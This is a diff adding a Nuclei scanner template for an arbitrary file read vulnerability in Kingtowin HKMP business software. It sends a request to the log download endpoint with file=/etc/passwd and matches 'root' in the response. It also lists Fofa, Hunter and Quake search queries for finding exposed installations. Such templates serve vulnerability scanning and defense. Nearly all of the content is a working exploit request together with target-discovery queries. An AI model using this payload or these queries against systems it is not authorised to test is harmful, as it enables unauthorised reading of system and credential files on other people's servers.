@@ -1,0 +1,32 @@
+id: Kingtowin_HKMP_download_Fileread
+
+info:
+  name: Kingtowin_HKMP_download_Fileread
+  author: HK
+  severity: medium
+  description: 金斗云-HKMP智慧商业软件download任意文件读取漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="金斗云 Copyright"
+    Hunter-query: body="金斗云 Copyright"
+    Quake-query: body="金斗云 Copyright"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /admin/log/download?file=/etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Accept-Encoding: gzip
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - root
